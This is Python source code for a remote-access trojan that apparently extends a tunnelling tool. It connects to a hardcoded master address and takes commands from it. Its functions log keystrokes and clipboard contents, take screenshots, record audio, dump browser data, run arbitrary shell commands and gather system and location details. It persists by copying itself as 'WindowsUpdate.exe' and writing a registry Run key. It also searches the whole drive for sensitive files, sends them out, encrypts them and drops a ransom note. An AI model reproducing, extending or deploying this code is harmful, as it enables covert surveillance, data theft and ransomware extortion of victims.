import argparse
import io
import os
import platform
import shutil
import time
import zipfile
import keyboard
import pyperclip
import requests
import winshell
from scipy.io.wavfile import write
from PIL import ImageGrab
import atexit
from tools.browsers import dump_sensible_data
from tools.common_func import *
import sounddevice as sd
import concurrent.futures

from tools.files import decrypt_file, encrypt_file
from tools.output_capture import OutputCapture

my_public_ip = "192.168.1.107:5555"

buffer = []  # Buffer to hold key presses
last_write_time = [time.time()]  # Time we last wrote to the file
last_key_time = [time.time()]  # Time of last key press

spare_agent_pool = {}

testing = True

file_types = ['txt', 'csv', 'xml', 'json', 'yaml', 'ini', 'xls', 'xlsx', 'doc', 'docx', 'pdf', 'ppt', 'pptx',
                        'zip', 'tar', 'gz', '7z', 'rar', 'sqlite', 'db', 'jpg', 'jpeg', 'png', 'gif', 'bmp', 'tiff',
                        'psd', 'eps', 'svg', 'mp3', 'wav', 'flac', 'aac', 'mp4', 'avi', 'mov', 'mkv', 'wmv', 'flv',
                        'mpg', 'mpeg', 'webm', 'ogg', 'html', 'htm', 'php', 'asp']



excluded_directories = ['.', "Windows", "Program Files", "Program Files (x86)", 'Adobe', 'Steam', 'Epic', '.cache',
                        'Epic Games', 'Docker', "ProgramData", "$Recycle.Bin", "System Volume Information", "AppData",
                        "Temp", "Documents and Settings", "Recovery", "MSOCache", "Intel", "NVIDIA",
                        "AMD", "Git", "Common Files", "All Users", "Default", "Default User", "boot", "EFI",
                        "EFI System", "EFI Boot", "System", "Android", "Microsoft", "tmpfs", "var",
                        "usr", "sbin", "proc", "bin", "dev", "etc", "home", "lib", "opt", "root", "run",
                        "srv", "sys", "tmp", 'venv', 'Games', 'Public', 'Templates',
                        'Programs', 'Start Menu', 'Recent', 'SendTo', 'Local Settings', 'Local', 'Roaming',
                        'IntelGraphicsProfiles', 'NV_Cache', 'NVIDIA Corporation', 'NvStreamSrv', 'NvTelemetry',
                        'NvBackend', 'NVIDIA Corporation\\Installer2', 'NVIDIA Corporation\\NV_Cache', 'Windows.old',
                        'Windows10Upgrade', 'PerfLogs', 'Microsoft.NET', 'WindowsApps',
                        'Application Data', 'WindowsServiceProfiles', 'System32', 'SysWOW64', 'Installer',
                        'C:\$WINDOWS.~BT', 'C:\$Windows.~WS', 'C:\$Recycle.Bin', 'C:\$GetCurrent', 'Config.Msi',
                        'node_modules']

sensitive_filenames = [
    "resume", "tax", "return", "bank", "statement", "passport", "config", "settings", "database",
    "backup", "wallet", "keystore", "id", "rsa", "pub", "my", "key", "passwords", "kdbx",
    "encryption", "certificate", "private", "notes", "script", "restore", "nginx",
    "apache", "recovery", "codes", "project", "email", "important", "document", "confidential",
    "report", "financial", "plan", "medical", "records", "crypto", "bitcoin", "ethereum",
    "secret", "auth", "vpn", "credit", "forms", "2023", "scan", "login", "encrypted",
    "files", "server", "ssh", "business", "research", "data", "contracts", "photos",
    "diary", "legal", "account", "source", "design", "emails", "test", "results", "social", "api",
    "projects"
]


names_to_avoid = [
    "temp", "cache", "tmp", "desktop.ini"
]



output_capture = OutputCapture()
#sys.stdout = output_capture


@atexit.register
def close_listening_socket_at_exit():
    log.info("exiting...")
    for s in spare_agent_pool:
        address = s
        log.info("closing socket: {} {}".format(address[0], address[1]))
        try_close(s)


def is_sensitive_file(file_path):
    file_name = os.path.basename(file_path)
    file_extension = file_name.split('.')[-1].lower()
    return (file_extension in file_types or file_name in sensitive_filenames) and file_name not in names_to_avoid


def get_system_info():
    system_info = {}
    string = ''

    system_info['System'] = platform.system()
    system_info['Node Name'] = platform.node()
    system_info['Release'] = platform.release()
    system_info['Version'] = platform.version()
    system_info['Machine'] = platform.machine()
    system_info['Processor'] = platform.processor()

    for key, value in system_info.items():
        string += f"{key}: {value}\n"

    return string


def get_ip_location():
    ip_info = {}
    string = ''

    # Retrieve public IP
    response = requests.get('https://api.ipify.org?format=json')
    ip_info['IP'] = response.json()['ip']

    # Retrieve IP location
    response = requests.get(f"http://ip-api.com/json/{ip_info['IP']}")
    location_data = response.json()
    if response.status_code == 200 and location_data['status'] == 'success':
        ip_info['Country'] = location_data['country']
        ip_info['State'] = location_data['regionName']
        ip_info['City'] = location_data['city']
    else:
        print("Failed to retrieve IP location information.")

    for key, value in ip_info.items():
        string += f"{key}: {value}\n"

    return string


def run_cmd_command(command):
    import subprocess
    commands_separated = command.splitlines()
    try:
        results = []
        for command in commands_separated:
            result = subprocess.run(command, shell=True, capture_output=True, text=True)
            results.append(result.stdout.strip())
        output_string = '\n'.join(results)
        return output_string
    except subprocess.CalledProcessError as e:
        print(f"Command execution failed with error: {e}")
        return None


def walk_trough_drive(directory_path, password, agent, address, encrypt="", decrypt="", save_files="False"):
    def create_urgent_file():
        file_name = "READ_ME_IT_IS_URGENT.txt"
        file_content = "Some of your most valuable files were encrypted. You can't do anything about it. \n" \
                       "Send me an email at: xxx@xxx.com so we can discuss prices. \n" \
                       "\n" \
                       "Ps: I know the contents of the files already."

        # Get the path to the desktop, documents, and downloads folders
        desktop_path = os.path.join(os.path.expanduser("~"), "Desktop")
        documents_path = os.path.join(os.path.expanduser("~"), "Documents")
        downloads_path = os.path.join(os.path.expanduser("~"), "Downloads")

        # Create the full file path in each directory
        file_paths = [
            os.path.join(downloads_path, file_name),
            os.path.join(documents_path, file_name),
            os.path.join(desktop_path, file_name),
        ]

        # Write the file content in each directory
        for file_path in file_paths:
            try:
                with open(file_path, "w") as f:
                    f.write(file_content)
                print(f"File created: {file_path}")
            except IOError as e:
                print(f"Error creating file: {e}")

    def generate_encryption_key_bytes(content):
        file_content = content.encode('utf-8')

        # Get the current timestamp
        current_time = time.localtime()
        timestamp = time.strftime("%d-%m-%y_%H-%M", current_time)

        return f"encryption_key_{timestamp}.txt", file_content

    if encrypt == "True":
        from cryptography.fernet import Fernet
        key = Fernet.generate_key()

    files_successfully_encrypted = 0  # Variable to store the number of successfully encrypted files
    files_encryption_errors = 0  # Variable to store the number of files with encryption errors

    if save_files == "True":

        in_memory_zip = io.BytesIO()  # Create a BytesIO object to hold the zip file in memory
        with zipfile.ZipFile(in_memory_zip, 'w', zipfile.ZIP_DEFLATED) as zipf:
            for root, dirs, files in os.walk(directory_path):
                if "$" in root or any(excl_dir in root for excl_dir in excluded_directories):
                    continue

                print(f"Entering folder: {root}")

                for filename in files:
                    filepath = os.path.join(root, filename)
                    script_name = os.path.basename(__file__).replace('.py', '.exe')

                    if script_name not in filepath and is_sensitive_file(filepath):

                        print("-----------------------------------------------------")

                        try:
                            file_size = os.path.getsize(filepath)

                            if file_size > 50000000:
                                continue

                            # Get the relative path of the file within the directory structure
                            relative_path = os.path.relpath(filepath, directory_path)

                            with open(filepath, 'rb') as file:
                                file_bytes = file.read()

                            # Add file bytes to the in-memory zip with the relative path
                            zipf.writestr(relative_path, file_bytes)

                            print(f"Added {filepath} to ZIP")

                            if encrypt == "True":
                                print(f"File {filepath} will be encrypted now.")

                                encrypt_file(filepath, key)

                                # Increment the count of successfully encrypted files
                                files_successfully_encrypted += 1
                                print("-----------------------------------------------------")

                        except Exception as e:
                            files_encryption_errors += 1  # Increment the count of files with encryption errors
                            print(f"Couldn't zip {filepath}, why: {e}")
                            print("-----------------------------------------------------")

                    if decrypt == "True" and filepath.endswith('.fkd'):
                        print(f"Decrypting file {filepath}")
                        decrypt_file(filepath, password)
                        print("-----------------------------------------------------")

            if encrypt == "True":
                encrypt_done_file_text = f"({address.getpeername()[0]}) encryption Key is: {key.decode()}"
                encrypt_file_name, encrypt_file_content = generate_encryption_key_bytes(encrypt_done_file_text)
                zipf.writestr(encrypt_file_name, encrypt_file_content)

        print("Encryption/Zipping of files done successfully")
        print(f"Files successfully encrypted: "
              f"{files_successfully_encrypted - files_encryption_errors}/{files_successfully_encrypted}")
        print(f"Files with encryption errors: {files_encryption_errors}")

        # Get the bytes of the in-memory zip
        zip_bytes = in_memory_zip.getvalue()

        # Get the current timestamp
        current_time = time.localtime()
        timestamp = time.strftime("%d-%m-%y_%H-%M", current_time)

        try:
            # Send the zip bytes to the master
            agent.send_file_to_master(address, f'personal_files_{timestamp}.zip', zip_bytes)

        except Exception as e:
            print("Error occurred during sending the zip file:", e)

        finally:
            # Close the BytesIO object
            in_memory_zip.close()

        if encrypt == "True":
            create_urgent_file()

    else:

        for root, dirs, files in os.walk(directory_path):
            if "$" in root or any(excl_dir in root for excl_dir in excluded_directories):
                continue

            print(f"Entering folder: {root}")

            for filename in files:
                filepath = os.path.join(root, filename)
                script_name = os.path.basename(__file__).replace('.py', '.exe')

                if decrypt == "True":
                    if filepath.endswith('.fkd'):
                        print("-----------------------------------------------------")

                        print(f"Decrypting file {filepath}")

                        decrypt_file(filepath, password)

                        print("-----------------------------------------------------")

                else:
                    if script_name not in filepath and is_sensitive_file(filepath):
                        try:
                            file_size = os.path.getsize(filepath)

                            if file_size > 50000000:
                                continue

                            if encrypt == "True":
                                print("-----------------------------------------------------")

                                print(f"File {filepath} will be encrypted now.")
                                encrypt_file(filepath, key)

                                # Increment the count of successfully encrypted files
                                files_successfully_encrypted += 1

                        except Exception as e:
                            files_encryption_errors += 1  # Increment the count of files with encryption errors
                            print(f"Couldn't encrypt {filepath}, why: {e}")

                        print("-----------------------------------------------------")

        if decrypt == "True":
            print('Decryption of files done successfully')
            agent.send_file_to_master(address, "encrypt_done", "None")

        if encrypt == "True":
            # address.send("encrypt_done".encode('utf-8'))
            print("Encryption of files done successfully")
            print(
                f"Files successfully encrypted: {files_successfully_encrypted - files_encryption_errors}/{files_successfully_encrypted}")
            print(f"Files with encryption errors: {files_encryption_errors}")

            encrypt_done_file_text = f"({address.getpeername()[0]}) encryption Key is: {key.decode()}"
            encrypt_file_name, encrypt_file_content = generate_encryption_key_bytes(encrypt_done_file_text)
            agent.send_file_to_master(address, encrypt_file_name, encrypt_file_content)
            create_urgent_file()

    print("Done analyzing folders")


def copy_self_to_temp():
    # Get the path of the running executable
    exe_path = sys.executable

    # Get the name of the executable
    exe_name = os.path.basename(exe_path)

    # Get the temp directory in appdata
    temp_dir = os.path.join(os.getenv('APPDATA'), 'temp')

    # Check if the executable is already in the appdata folder
    if not exe_path.startswith(temp_dir):
        # Create the temp directory if it does not exist
        os.makedirs(temp_dir, exist_ok=True)

        # Define the destination path with the new name
        dest_path = os.path.join(temp_dir, 'WindowsUpdate.exe')

        # Copy the executable to the destination path and rename it
        shutil.copy2(exe_path, dest_path)

        print(f'Copied {exe_path} to {dest_path}')

        command = f'reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v WindowsUpdate /t REG_SZ /d "{dest_path}" /f'

        print(f"Tried to inject to REG. Output: {run_cmd_command(command)}")


def add_to_startup(path):
    # Get the path of the running executable

    # Get the Startup folder
    startup_folder = winshell.startup()

    # Get the name of the executable
    exe_name = os.path.basename(path)

    # Define the destination path
    dest_path = os.path.join(startup_folder, exe_name + '.lnk')

    # Create a shortcut
    winshell.CreateShortcut(
        Path=dest_path,
        Target=path,
        Icon=(path, 0),
        Description="svhost"
    )

    print(f'Added {path} to startup programs.')


def capture_screen_state():
    # Capture the screen state
    screenshot = ImageGrab.grab(include_layered_windows=True, all_screens=True)

    # Convert the screen state to PIL Image
    screen_state = screenshot.copy()

    # Get the current timestamp
    current_time = time.localtime()
    timestamp = time.strftime("%d-%m-%y_%H-%M", current_time)

    # Convert the screen state image to bytes
    image_bytes = io.BytesIO()
    screen_state.save(image_bytes, format='PNG')
    image_bytes = image_bytes.getvalue()

    return timestamp, image_bytes


# Define a global variable to track the last key press
last_key = ''


def log_key(event):
    global last_key

    current_time = time.time()

    # Check if more than 5 seconds have passed since the last key press
    if current_time - last_key_time[0] > 5:
        buffer.append('\n')
    elif event.name == 'space':
        buffer.append(' ')
    elif event.name == 'enter':
        buffer.append('\n')
    elif event.name == 'backspace' and buffer:
        buffer.pop()  # remove the last character from the buffer
    elif event.name in ['ctrl', 'alt', 'win', 'left windows', 'right windows', 'delete']:
        last_key = event.name
    else:
        if last_key == 'ctrl' and event.name == 'v':
            clipboard_content = pyperclip.paste()
            buffer.append(clipboard_content)
            last_key = ''  # clear the last_key variable
        elif last_key in ['shift', 'right shift', 'left shift']:
            buffer.append(event.name.upper())
            last_key = ''  # clear the last_key variable
        else:
            if event.name not in ['shift', 'right shift', 'left shift', 'ctrl', 'alt', 'win', 'left windows',
                                  'right windows', 'delete']:
                buffer.append(event.name)
            last_key = event.name

    last_key_time[0] = current_time


def dump_keys(master, address):
    # Convert the buffer to bytes
    keys_bytes = ''.join(buffer).encode('utf-8')
    # buffer.clear()  # Clear the buffer

    # Send the file data to the master
    # Get the current timestamp
    current_time = time.localtime()
    timestamp = time.strftime("%d-%m-%y_%H-%M", current_time)
    file_name = f'keys_{timestamp}.txt'
    master.send_file_to_master(address, file_name, keys_bytes)


def record_audio(master, address, duration=30):
    fs = 44100
    # Record audio
    print("Recording...")
    my_recording = sd.rec(int(duration * fs), samplerate=fs, channels=2)
    sd.wait()  # Wait for the recording to finish:
    print("Recording completed")

    current_time = time.localtime()
    timestamp = time.strftime("%d-%m-%y_%H-%M-%S", current_time)

    # Save the audio recording as a .wav file
    file_name = f"record_{timestamp}.wav"
    write(file_name, fs, my_recording)

    try:
        # Send the audio file to the master
        with open(file_name, 'rb') as f:
            audio_bytes = f.read()
        master.send_file_to_master(address, file_name, audio_bytes)
        print("Audio file sent to the master")

        # Remove the audio file
        os.remove(file_name)
    except Exception as e:
        print("Error occurred during sending the audio file:", e)


def take_screenshot_and_upload(master, address):
    # Capture screenshot
    timestamp, image_bytes = capture_screen_state()

    # Generate the file name
    file_name = f'screenshot_{timestamp}.png'

    # Send the file data to the master
    master.send_file_to_master(address, file_name, image_bytes)


class Agent(object):
    """
    agent socket阶段
        连接master->等待->心跳(重复)--->握手-->正式传输数据->退出
    """

    def __init__(self, communicate_addr, target_addr, max_spare_count=5, ssl=False):
        self.communicate_addr = communicate_addr
        self.target_addr = target_addr
        self.max_spare_count = max_spare_count

        self.socket_bridge = SocketBridge()


    def remove_agent_from_pool(self, addr_agent):
        try:
            conn_agent = None
            for agent in spare_agent_pool:
                conn_agent = agent['conn_agent']
                if conn_agent == addr_agent:
                    break

            if conn_agent is not None:
                conn_agent.close()
                del spare_agent_pool[conn_agent]
                print(f"Agent {addr_agent} removed from the pool and connection closed.")
            else:
                print(f"Agent {addr_agent} not found in the pool.")
        except Exception as e:
            print(f"Error removing Agent {addr_agent} from the pool: {e}")

    def _connect_master(self):
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.connect(self.communicate_addr)

        # Get the path of the running executable
        exe_path = sys.executable

        # Get the temp directory in appdata
        temp_dir = os.path.join(os.getenv('APPDATA'), 'temp')

        # Check if the executable is already in the appdata folder
        if not exe_path.startswith(temp_dir):
            sock.send("full".encode('utf-8'))
        else:
            sock.send("limited".encode('utf-8'))

        spare_agent_pool[sock.getsockname()] = {
            "conn_agent": sock,
            "can_beat": True,
            "last_heartbeat_time": time.time()
        }

        return sock

    def _connect_target(self):
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.connect(self.target_addr)

        log.debug("connected to target[{}] at: {}".format(
            sock.getpeername(),
            sock.getsockname(),
        ))

        return sock

    def _response_heartbeat(self, conn_agent, hb_from_master):
        # assert isinstance(hb_from_master, CtrlPkg)
        # assert isinstance(conn_agent, socket.SocketType)
        if hb_from_master.prgm_ver < 0x000B:
            # shootback before 2.2.5-r10 use two-way heartbeat
            #   so just send a heart_beat pkg back
            conn_agent.send(CtrlPkg.pbuild_heart_beat().raw)
            return True
        else:
            # newer version use TCP-like 3-way heartbeat
            #   the older 2-way heartbeat can't only ensure the
            #   master --> agent pathway is OK, but the reverse
            #   communicate may down. So we need a TCP-like 3-way
            #   heartbeat
            conn_agent.send(CtrlPkg.pbuild_heart_beat().raw)
            pkg, verify = CtrlPkg.recv(
                conn_agent,
                expect_ptype=CtrlPkg.PTYPE_HEART_BEAT)  # type: CtrlPkg,bool
            if verify:
                log.debug("heartbeat success {}".format(
                    fmt_addr(conn_agent.getsockname())))
                return True
            else:
                log.warning(
                    "received a wrong pkg[{}] during heartbeat, {}".format(
                        pkg, conn_agent.getsockname()
                    ))
                return False

    def _stage_ctrlpkg(self, conn_agent):
        """
        handling CtrlPkg until handshake

        well, there is only one CtrlPkg: heartbeat, yet

        it ensures:
            1. network is ok, master is alive
            2. master is shootback_master, not bad guy
            3. verify the SECRET_KEY
            4. tell agent it's time to connect target

        handshake procedure:
            1. master hello --> agent
            2. agent verify master's hello
            3. agent hello --> master
            4. (immediately after 3) agent connect to target
            4. master verify agent
            5. enter real data transfer
        """
        while True:  # 可能会有一段时间的心跳包

            # recv master --> agent
            # timeout is set to `SPARE_SLAVER_TTL`
            # which means if not receive pkg from master in SPARE_SLAVER_TTL seconds,
            #   this connection would expire and re-connect
            pkg, correct = CtrlPkg.recv(conn_agent, SPARE_SLAVER_TTL)  # type: CtrlPkg,bool

            if not correct:
                return None

            log.debug("CtrlPkg from {}: {}".format(conn_agent.getpeername(), pkg))

            if pkg.pkg_type == CtrlPkg.PTYPE_HEART_BEAT:
                # if the pkg is heartbeat pkg, enter handshake procedure
                if not self._response_heartbeat(conn_agent, pkg):
                    return None

            elif pkg.pkg_type == CtrlPkg.PTYPE_HS_M2S:
                # 拿到了开始传输的握手包, 进入工作阶段

                break

        # send agent hello --> master
        actual_conn = self._response_handshake(conn_agent, pkg)

        return actual_conn

    def _response_handshake(self, conn_agent, handshake_pkg):
        """
        response master's handshake
        check if ssl is avail, if avail, establish ssl

        Args:
            conn_agent (socket.socket):
            handshake_pkg (CtrlPkg):

        Returns:
            socket.socket|ssl.SSLSocket
        """
        conn_agent.send(CtrlPkg.pbuild_hs_s2m(ssl_avail=self.ssl_avail).raw)

        if not self.ssl_avail or handshake_pkg.data[1] == CtrlPkg.SSL_FLAG_NONE:
            if self.ssl_avail:
                log.warning('master %s does not enabled SSL, fallback to plain', conn_agent.getpeername())
            return conn_agent
        else:
            ssl_conn_agent = self.ssl_context.wrap_socket(conn_agent, server_side=False)  # type: ssl.SSLSocket
            log.debug('ssl established agent: %s', ssl_conn_agent.getpeername())
            return ssl_conn_agent

    def _transfer_complete(self, addr_agent):
        """a callback for SocketBridge, do some cleanup jobs"""
        pair = spare_agent_pool.pop(addr_agent)
        try_close(pair['conn_agent'])
        log.info("agent complete: {}".format(addr_agent))

    def execute_command(self, command, actual_conn):
        print(f"Agent: {actual_conn.getsockname()} is executing command: {command}")

        # Start a new thread for each command
        command_thread = threading.Thread(target=self._execute_command_in_thread, args=(command, actual_conn))
        command_thread.start()

    def _execute_command_in_thread(self, command, actual_conn):
        socket_name = actual_conn.getsockname()

        try:
            if command == "OK":
                self._transfer_complete(socket_name)
            if command == "screenshot":
                take_screenshot_and_upload(self, actual_conn)

            elif command == "audio":
                record_audio(self, actual_conn)

            elif command == "keys":
                dump_keys(self, actual_conn)

            elif command == "browsers":
                dump_sensible_data(self, actual_conn)

            elif command.startswith("cmd╚"):
                final_command = command.replace("cmd╚", "")

                output_command = run_cmd_command(final_command)

                output_command += "\n End of Output."

                output_command_size = len(output_command.encode('utf-8'))

                # Send the output size and output string
                actual_conn.send(str(output_command_size).encode('utf-8'))
                time.sleep(0.1)
                actual_conn.send(output_command.encode('utf-8'))

            elif command == "info":
                infos = ''
                infos += get_ip_location()
                infos += get_system_info()
                # Get the size of the output string and file data
                infos_size = len(infos)

                # Send the output size and output string
                actual_conn.send(str(infos_size).encode('utf-8'))
                time.sleep(0.1)
                actual_conn.send(infos.encode('utf-8'))

            elif command.startswith("encrypt╚"):
                command_clean = command.replace("encrypt╚", "")
                command_clean = command_clean.split("╚")
                password_clean = command_clean[0]
                save_files = command_clean[1]
                encrypt = command_clean[2]
                decrypt = command_clean[3]
                password = b'' + password_clean.encode('utf-8')
                print(f"Received encryption key: {password}")
                print(f"Retrieve Files: {save_files}")
                print(f"Is encryption process: {encrypt}")
                print(f"Is decryption process: {decrypt}")
                print(f"Starting lookup on C:/..")
                walk_trough_drive(os.path.abspath(os.sep), password, self, actual_conn, encrypt=encrypt,
                                  decrypt=decrypt, save_files=save_files)

        except Exception as e:
            print(f"\n{e}\n"
                  f"Error ocurred. \n")
            self.send_file_to_master(actual_conn, "error", "None")

        try:
            print(f"Agent: {actual_conn.getsockname()} is enabling heartbeat after: {command}")
            spare_agent_pool[actual_conn.getsockname()]['can_beat'] = True
        except OSError:
            pass
        captured_output = output_capture.output
        captured_output.clear()
        #self._transfer_complete(actual_conn.getsockname())

    def send_data_with_timeout(self, conn, data, timeout=5):
        start_time = time.time()
        sent = 0

        while sent < len(data):
            try:
                sent_bytes = conn.send(data[sent:])
                if sent_bytes == 0:
                    # Handle the case where the connection is closed prematurely
                    raise Exception("Connection closed prematurely")
                sent += sent_bytes
            except Exception as e:
                # Handle any exceptions that may occur during sending
                print(f"Error sending data: {e}")
                break

            # Check if the timeout has been exceeded
            if time.time() - start_time > timeout:
                print("Timeout exceeded while sending data")
                break

    def send_file_to_master(self, conn, filename, file_data):
        try:
            print(f"Agent: {conn.getsockname()} is sending {filename}")

            captured_output = output_capture.output
            output_string = ''.join(captured_output)

            # Get the size of the output string and file data
            output_size = len(output_string.encode('utf-8'))

            # Send the output size and output string
            conn.send(str(output_size).encode('utf-8'))
            self.send_data_with_timeout(conn, output_string.encode('utf-8'))

            if filename == "encrypt_done":
                conn.send("encrypt_done".encode('utf-8'))
                return

            if filename == "error":
                conn.send("error".encode('utf-8'))
                return

            file_size = len(file_data)

            file_and_size = f'{str(file_size)}§{filename}'

            conn.send(file_and_size.encode('utf-8'))

            # this is extremely needed
            time.sleep(0.2)

            # Send the data packet to the master using send_data_with_timeout
            self.send_data_with_timeout(conn, file_data)

            print(f'Agent: {conn.getsockname()} has successfully sent {filename}')

        except Exception as e:
            print(f"Agent: {conn.getsockname()} failed to send file to master: {e}")
            self.remove_agent_from_pool(conn)

    def clean_up_connection(self, conn_agent, addr_agent):
        try:
            try_close(conn_agent)
            try_close(addr_agent)
            del spare_agent_pool[addr_agent]
        except Exception:
            pass

    def _agent_working(self, conn_agent):
        addr_agent = conn_agent.getsockname()
        addr_master = conn_agent.getpeername()
        while True:

            # ----------- receive command from agent machine ----------
            try:
                can_receive_heartbeat = spare_agent_pool[addr_agent]['can_beat']
                last_heartbeat_time = spare_agent_pool[addr_agent]['last_heartbeat_time']

                command = self.receive_command(conn_agent)  # Modify this line with your command receiving logic

                if not can_receive_heartbeat and command == "heartbeat":
                    return

                if command == "" and time.time() - last_heartbeat_time > 10 and can_receive_heartbeat:
                    print(f"Agent: {addr_agent} don't received heartbeat, closing it")
                    self.clean_up_connection(conn_agent, addr_agent)
                    return

                if command == "" and time.time() - last_heartbeat_time > 300:
                    print(f"Agent: {addr_agent} don't received heartbeat in a long time, master is off, closing it")
                    self.clean_up_connection(conn_agent, addr_agent)
                    return

                elif command == "heartbeat":
                    # print(f"Agent: {addr_agent} - Received heartbeat")
                    conn_agent.send("heartbeat".encode('utf-8'))
                    spare_agent_pool[addr_agent]['last_heartbeat_time'] = time.time()

            except Exception as e:
                log.error("Failed to receive command from agent machine. Closing the agent and opening a new one.")
                self.clean_up_connection(conn_agent, addr_agent)
                return

            # ----------- process the received command ----------
            try:
                if command != "heartbeat" and command != "":
                    spare_agent_pool[addr_agent]['can_beat'] = False
                    print(f"Agent: {conn_agent.getsockname()} is disabling heartbeat to execute: {command}")
                    self.execute_command(command, conn_agent)  # Modify this line with your command processing logic
            except Exception as e:
                log.error(f"Failed to process command: {e}")

        return

    def receive_command(self, conn):
        # Set the buffer size according to your protocol requirements
        buffer_size = 1024

        try:
            # Receive the command from the agent machine
            command_bytes = conn.recv(buffer_size)
            command = command_bytes.decode().strip()
            return command
        except:
            return ""

    def serve_forever(self):
        self.socket_bridge.start_as_daemon()  # hi, don't ignore me

        err_delay = 0
        max_err_delay = 15
        spare_delay = 0.08
        default_spare_delay = 0.08

        # Calculate the number of worker threads based on 50% of available CPU cores
        max_workers = max(1, os.cpu_count() // 2)

        with concurrent.futures.ThreadPoolExecutor(max_workers=max_workers) as executor:
            while True:
                if len(spare_agent_pool) >= max_workers:
                    time.sleep(spare_delay)
                    spare_delay = (spare_delay + default_spare_delay) / 2.0
                    continue
                else:
                    spare_delay = 0.0

                try:
                    conn_agent = self._connect_master()
                except Exception as e:
                    log.warning("unable to connect master {}".format(e), exc_info=True)
                    time.sleep(err_delay)
                    if err_delay < max_err_delay:
                        err_delay += 1
                    continue

                try:
                    executor.submit(self._agent_working, conn_agent)
                    log.info("connected to master[{}] at {} total: {}".format(
                        fmt_addr(conn_agent.getpeername()),
                        fmt_addr(conn_agent.getsockname()),
                        len(spare_agent_pool),
                    ))
                except Exception as e:
                    log.error("unable to submit agent thread: {}".format(e))
                    log.debug(traceback.format_exc())
                    time.sleep(err_delay)

                    if err_delay < max_err_delay:
                        err_delay += 1
                    continue

                err_delay = 0


def run_agent(communicate_addr, target_addr, max_spare_count=5, ssl=False):
    log.info("running as agent, master addr: {} target: {}".format(
        fmt_addr(communicate_addr), fmt_addr(target_addr)
    ))

    Agent(communicate_addr, target_addr,
          max_spare_count=max_spare_count,
          ssl=ssl,
          ).serve_forever()


def argparse_agent(master=None, target=None, secretkey='shootback', SPARE_SLAVER_TTL=300, max_spare_count=5, ssl=None,
                   verbose=False, quiet=False):
    # Set up the argument parser
    parser = argparse.ArgumentParser()

    # Add your arguments here
    parser.add_argument("-m", "--master", default=master)
    parser.add_argument("-t", "--target", default=target)
    parser.add_argument("--secretkey", default=secretkey)
    parser.add_argument("--SPARE_SLAVER_TTL", default=SPARE_SLAVER_TTL)
    parser.add_argument("--max_spare_count", default=max_spare_count)
    parser.add_argument("--ssl", default=ssl)
    parser.add_argument("-v", "--verbose", action="store_true", default=verbose)
    parser.add_argument("-q", "--quiet", action="store_true", default=quiet)

    # Parse the arguments
    args = parser.parse_args()

    return args


def main_agent(master, target):
    # global SPARE_SLAVER_TTL

    args = argparse_agent(master, target)

    if args.verbose and args.quiet:
        print("-v and -q should not appear together")
        exit(1)

    communicate_addr = split_host(args.master)
    target_addr = split_host(args.target)

    set_secretkey(args.secretkey)

    SPARE_SLAVER_TTL = args.SPARE_SLAVER_TTL
    max_spare_count = args.max_spare_count
    if args.quiet < 2:
        if args.verbose:
            level = logging.DEBUG
        elif args.quiet:
            level = logging.WARNING
        else:
            level = logging.INFO
        configure_logging(level)

    log.info("shootback {} agent running".format(version_info()))
    log.info("Master: {}".format(fmt_addr(communicate_addr)))
    log.info("Target: {}".format(fmt_addr(target_addr)))

    # communicate_addr = ("localhost", 12345)
    # target_addr = ("93.184.216.34", 80)  # www.example.com

    run_agent(communicate_addr, target_addr,
              max_spare_count=max_spare_count,
              ssl=args.ssl,
              )

    # Create and start the task loop thread


# sys.stdout = open('output.txt', 'w+')
# copy_self_to_temp()

keyboard.on_press(log_key)

# Create a thread that will run the main_agent function
# task_thread = threading.Thread(target=main_agent, args=("187.65.202.131:5555", "127.0.0.1:22"))
main_agent(my_public_ip, "127.0.0.1:22")

# Start the thread
# task_thread.start()
